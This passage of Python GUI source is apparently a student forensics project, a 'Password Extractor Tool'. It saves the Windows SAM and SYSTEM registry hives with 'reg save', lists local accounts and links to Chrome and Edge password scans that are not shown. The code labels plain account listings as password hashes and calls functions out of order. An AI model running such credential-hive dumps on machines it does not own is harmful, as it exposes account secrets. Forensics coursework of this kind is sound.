            backup_system_command = f'reg save HKLM\\SYSTEM "{system_backup_path}" /y'
            system_result = execute_command(backup_system_command)

            # Check for errors during backup
            if "Command Error" in sam_result or "Command Error" in system_result:
                return f"Failed to backup registry hives:\nSAM: {sam_result}\nSYSTEM: {system_result}"

            # PowerShell command to list local user accounts
            powershell_command = (
                "powershell Get-WmiObject -Class Win32_UserAccount -Filter \"LocalAccount=True\""
            )

            # Execute the PowerShell command
            output = execute_command(powershell_command)

            if "Command Error" in output:
                return f"Failed to extract passwords: {output}"

            # Return the extracted output
            return output

        except PermissionError:
            return "Administrative privileges are required to access the SAM file."
        except Exception as e:
            return f"Unexpected error: {e}"


    def display_passwords():
        """Displays extracted information in the GUI."""
        passwords = extract_sam_passwords()
        if "Error" in passwords:
            messagebox.showerror("Error", passwords)
        else:
            result_display.delete("1.0", tk.END)
            result_display.insert(tk.END, passwords)


    def clear_results():
        """Clears the displayed results."""
        result_display.delete("1.0", tk.END)


    def save_as_csv():
        """Saves the extracted results as a CSV file."""
        passwords = result_display.get("1.0", tk.END).strip()
        if passwords:
            try:
                with open("sam_passwords.csv", mode="w", newline="") as file:
                    writer = csv.writer(file)
                    writer.writerow(["User Account", "Password Hash"])  # Add headers if needed
                    for line in passwords.splitlines():
                        writer.writerow([line])  # This assumes each line contains user information
                messagebox.showinfo("Success", "Data saved as sam_passwords.csv")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save as CSV: {e}")
        else:
            messagebox.showwarning("Warning", "No data to save.")

    def open_hex_viewer(extracted_data):
        """Converts the extracted data into hex format and opens a hex viewer."""
        if not extracted_data:
            # Notify if there's no data to show
            no_data_window = Toplevel(root)
            no_data_window.title("Error")
            no_data_window.geometry("300x100")
            
            Label(
                no_data_window,
                text="No data to display in hex view!",
                fg="red",
                font=("Arial", 12)
            ).pack(pady=20)

            # Close the alert window after 0.5 seconds (500 milliseconds)
            no_data_window.after(500, no_data_window.destroy)
            return

        hex_viewer = Toplevel(root)
        hex_viewer.title("Password Extractor Hex Viewer")
        hex_viewer.state("zoomed")  # Make the window fullscreen
        hex_viewer.config(bg="light green")
        # Title Label
        Label(hex_viewer, text="Password Extractor Hex Viewer", font=("Arial", 24, "bold"), bg="#4682b4", fg="white").pack(fill="x", pady=10)
        
        # Frame for the text area
        main_frame = Frame(hex_viewer)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Text area for Hex View
        text_area = Text(main_frame, font=("Courier", 10), wrap=tk.NONE)
        text_area.pack(fill=tk.BOTH, expand=True)

        # Combine all rows into one hex representation
        all_data = extracted_data
        all_data_bytes = all_data.encode()
        for i in range(0, len(all_data_bytes), 16):
            hex_chunk = all_data_bytes[i:i + 16]
            hex_display = " ".join(f"{byte:02x}" for byte in hex_chunk)
            ascii_display = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in hex_chunk)
            text_area.insert(tk.END, f"{i:08x}  {hex_display:<48}  {ascii_display}\n")

        # Make the text area read-only
        text_area.config(state=tk.DISABLED)
        def close_hex_viewer():
            hex_viewer.destroy()

        back_button = Button(hex_viewer, text="Back", command=close_hex_viewer, bg="#f0ad4e", fg="black", font=("Arial", 12))
        back_button.pack(pady=20)

    # Main execution
    if __name__ == "__main__":
        extract_sam_passwords()
        switch_to_page("main")
        # GUI Setup
        root = tk.Tk()
        root.title("SAM Password Extractor")
        root.geometry("800x600")
        root.state("zoomed")
        root.configure(bg="light Green")  # Set window background color
        # Create a frame for the output area (to expand and fill available space)
        # Title Label
        Label(root, text="SAM Passwords Extractor", 
                font=("Arial", 24, "bold"), background="#4682b4", fg="white", anchor="center").pack(fill="x", pady=(20, 10), padx=20)

        
        output_frame = tk.Frame(root, bg="lightgray")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Create a ScrolledText widget for displaying output
        result_display = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD, font=("Arial", 10))
        result_display.pack(fill=tk.BOTH, expand=True)

        # Create a frame for the buttons (positioned at the bottom)
        button_frame = tk.Frame(root, bg="lightgray")
        button_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=10)

        # Start Scan button
        start_scan_button = tk.Button(button_frame, text="Start Scan", command=display_passwords, bg="#5bc0de", fg="black", font=("Arial", 12))
        start_scan_button.pack(side=tk.LEFT, padx=10, pady=10)

        # Clear button
        clear_button = tk.Button(button_frame, text="Clear", command=clear_results, bg="#f8d7da", fg="black", font=("Arial", 12))
        clear_button.pack(side=tk.LEFT,padx=10, pady=10)

        # Save as CSV button
        save_button = tk.Button(button_frame, text="Save as CSV", command=save_as_csv, bg="#d4edda", fg="black", font=("Arial", 12))
        save_button.pack(side=tk.RIGHT, padx=10, pady=10)

        # View as Hex button
        hex_button = tk.Button(button_frame, text="Hex Viewer", command=lambda: open_hex_viewer(result_display.get("1.0", tk.END).strip()), bg="#ffc107", fg="black", font=("Arial", 12))
        hex_button.pack(side=tk.LEFT, padx=10, pady=50)

        # Exit button
        exit_button = tk.Button(button_frame, text="Back", command=root.destroy, bg="#f0ad4e", fg="black", font=("Arial", 12))
        exit_button.pack(side=tk.RIGHT, padx=10, pady=10)

#------------------------------------------------------------------------------------------------------------#

# Function To handle Page Switching

#-----------------------------------------------------------------------------------------------------------#

root = Tk()
root.title("Password Extractor Tool")
root.geometry("800x600")
root.state("zoomed")
root.configure(bg="light Green")  # Set window background color

# Set up table styling with light colors
style = ttk.Style()
style.theme_use("default")
style.configure("Treeview",
                background="light Green",  # Light blue background
                foreground="black",
                rowheight=25,
                fieldbackground="#f0f8ff",
                borderwidth=5,  # Add borders to rows and columns
                relief="solid")  # Border style for the table
style.map("Treeview", background=[("selected", "#add8e6")], foreground=[("selected", "black")])
style = ttk.Style()
style.configure("Treeview", rowheight=30)  # Adjust the row height as needed

# Header styling
style.configure("Treeview.Heading",
                font=("Arial", 12, "bold"),
                background="Light Green",  # Sky blue for headers
                borderwidth=5,
                relief="solid")  # Adding border to headings

title = Frame(root, bg="#f0f8ff")  # Separate static frame for the title
title.pack(fill="both", expand=True, padx=10, pady=10)
# Title Label
Label(title, 
      text="Passwords Extractor", 
      font=("Arial", 36, "bold"),  # Bold and larger font size
      fg="black",  # Black text color (no background color)
      anchor="center", bg="#f0f8ff").pack(fill="x", pady=(20, 10), padx=20)  # Centered, with padding
def remove_title():
        title.pack_forget()  # Hide the title frame
frame = Frame(root, bg="light Green")  # Ensure frame has the same background color
frame.pack(fill="both", expand=True, padx=10, pady=10)


# Function to switch between different pages (scan modes)
def switch_to_page(page_name):
    # Hide all frames initially
    for widget in frame.winfo_children():
        widget.pack_forget()

    # Show the selected page's functionality
    if page_name == "temp_data_scan":
        temp_data_scan()
    elif page_name == "SAM_Scan":
        Sam_data_sacn()
    elif page_name == "chrome_scan":
        chrome_scan()
    elif page_name == "edge_scan":
        edge_scan()
    elif page_name == "About":
        about_page()
    elif page_name == "main":
        main_page()

#------------------------------------------------------------------------------------------------------------#

# About page

#-----------------------------------------------------------------------------------------------------------#


def about_page():
    # Clear the frame before loading new content
    for widget in frame.winfo_children():
        widget.destroy()
    
    root.after(200, remove_title)
    # Title for About Section
    Label(
        frame, text="About", font=("Arial", 30, "bold"), bg="light green", fg="#3b5998"  # Darker shade for contrast
    ).pack(pady=(20, 10))

    # Purpose paragraph with padding and centered text
    purpose_text = (
        "This application was developed as part of our semester final project for the Digital Forensics and Investigation (DFI) course.\n\n"
        "The goal is to provide a tool for extracting and displaying saved passwords from Microsoft Edge and Chrome browser databases, "
        "and for scanning temporary folders in the system for sensitive data. This tool aims to support forensic analysis and "
        "data recovery within controlled environments."
    )
    Label(
        frame, text=purpose_text, font=("Arial", 14), wraplength=750, justify="left",
        bg="light green", fg="#333", padx=20
    ).pack(pady=(10, 20))

    # Instructor Information
    Label(frame, text="Instructor", font=("Arial", 18, "bold"), bg="light green", fg="#2e4053").pack(pady=(5, 5))
    Label(frame, text="Prof. Mehmood Ul Hassan", font=("Arial", 14, "italic"), bg="#a8e6cf", fg="black").pack(pady=(0, 20))

    # Developer Information
    Label(frame, text="Developers", font=("Arial", 18, "bold"), bg="light green", fg="#2e4053").pack(pady=(10, 5))

    # Developer names with styling for improved alignment and clarity
    developers_text = (
        "Mustansir Hussain (22I-1764)\n"
        "Muazam Ali (22I-1734)\n"
        "Abdul Muhaiman (22I-1694)\n"
        "Eman Fatima (22I-1675)"
    )
    Label(
        frame, text=developers_text, font=("Arial", 14), bg="#a8e6cf", fg="black", justify="center"
    ).pack(pady=(5, 20))

    # Version Information
    Label(frame, text="Version: 1.0", font=("Arial", 14, "bold"), bg="light green", fg="#333").pack(pady=(10, 20))

    # Back button to return to the main page with custom styling
    back_button = Button(
        frame, text="Back to Main Page", command=lambda: switch_to_page("main"),
        font=("Arial", 14), bg="Green", fg="white", activebackground="#5faee3",
        padx=20, pady=10, relief="raised", bd=3, cursor="hand2"
    )
    back_button.pack(pady=20)


#------------------------------------------------------------------------------------------------------------#

#                                                       Main Function

#-----------------------------------------------------------------------------------------------------------#

# Function for Main page with buttons
def main_page():

    # Show the title and buttons for the main page
    Label(frame, text="Welcome to the Password Extractor Tool", font=("Arial", 24, "bold"), fg="green", bg="#f0f8ff").pack(fill="x", pady=(10, 20))

    # Create a Frame to hold the buttons and center them horizontally
    button_frame = Frame(frame, bg="#f0f8ff")
    button_frame.pack(pady=50, fill="x", padx=300)  # Center the buttons with padding from top and bottom

    # Function to handle button hover effects
    def on_enter(event, button):
        button.config(bg="#66b3ff")  # Light blue when hovered

    def on_leave(event, button):
        button.config(bg="#5bc0de")  # Default button color

    # Add consistent button colors and align them evenly
    button_options = {
        'bg': "green",
        'fg': "black",
        'font': ("Arial", 16, "normal"),
        'width': 20  # Ensures buttons are the same width
    }

    # Temp Data Scan button
    temp_data_button = Button(button_frame, text="Temp Data Scan", command=lambda: switch_to_page("temp_data_scan"), **button_options)
    temp_data_button.pack(padx=10, pady=10, fill="x")  # Use pack instead of grid
    temp_data_button.bind("<Enter>", lambda event, button=temp_data_button: on_enter(event, button))
    temp_data_button.bind("<Leave>", lambda event, button=temp_data_button: on_leave(event, button))
    # SAM file scan
    sam_scan_button = Button(button_frame, text="SAM Scan", command=lambda: switch_to_page("SAM_Scan"), **button_options)
    sam_scan_button.pack(padx=10, pady=10, fill="x")
    sam_scan_button.bind("<Enter>", lambda event, button=sam_scan_button: on_enter(event, button))
    sam_scan_button.bind("<Leave>", lambda event, button=sam_scan_button: on_leave(event, button))

    # Chrome Scan button
    chrome_button = Button(button_frame, text="Chrome Scan", command=lambda: switch_to_page("chrome_scan"), **button_options)
    chrome_button.pack(padx=10, pady=10, fill="x")  # Use pack instead of grid
    chrome_button.bind("<Enter>", lambda event, button=chrome_button: on_enter(event, button))
    chrome_button.bind("<Leave>", lambda event, button=chrome_button: on_leave(event, button))

    # Edge Scan button
    edge_button = Button(button_frame, text="Edge Scan", command=lambda: switch_to_page("edge_scan"), **button_options)
    edge_button.pack(padx=10, pady=10, fill="x")  # Use pack instead of grid
    edge_button.bind("<Enter>", lambda event, button=edge_button: on_enter(event, button))
    edge_button.bind("<Leave>", lambda event, button=edge_button: on_leave(event, button))
    # About button
    about_button = Button(button_frame, text="About", command=lambda: switch_to_page("About"), **button_options)
    about_button.pack(padx=10, pady=10, fill="x")  # Use pack instead of grid
    about_button.bind("<Enter>", lambda event, button=about_button: on_enter(event, button))
    about_button.bind("<Leave>", lambda event, button=about_button: on_leave(event, button))
    # Exit button
    exit_button = Button(button_frame, text="Exit", command=root.quit, **button_options)
    exit_button.pack(padx=10, pady=10, fill="x")
    exit_button.bind("<Enter>", lambda event, button=exit_button: on_enter(event, button))
    exit_button.bind("<Leave>", lambda event, button=exit_button: on_leave(event, button))
# Initialize with the main page
main_page()


 
root.mainloop()
